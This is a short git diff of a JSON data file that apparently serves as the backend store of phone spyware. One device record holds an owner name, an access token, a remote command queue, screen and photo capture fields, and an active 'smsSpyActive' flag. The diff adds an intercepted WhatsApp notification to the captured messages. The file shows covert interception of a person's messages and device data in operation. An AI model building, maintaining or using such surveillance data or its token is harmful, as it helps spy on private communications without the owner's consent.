@@ -2000,7 +2000,7 @@
     "deviceName": "HP-LUFFY-3AF2",
     "ownerUsername": "ziwoo",
     "token": "8577ec8c6cde38b8fe0a65278f547c49",
-    "lastSeen": 1777600136238,
+    "lastSeen": 1777600158316,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-01T01:39:27.608Z",
@@ -2015,7 +2015,16 @@
     "lastPhoto": null,
     "lastScreenFrame": null,
     "smsSpyActive": true,
-    "smsMessages": [],
+    "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "01/05 09:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777600159801
+      }
+    ],
     "galleryPhotos": [],
     "galleryDone": false,
     "contacts": [],
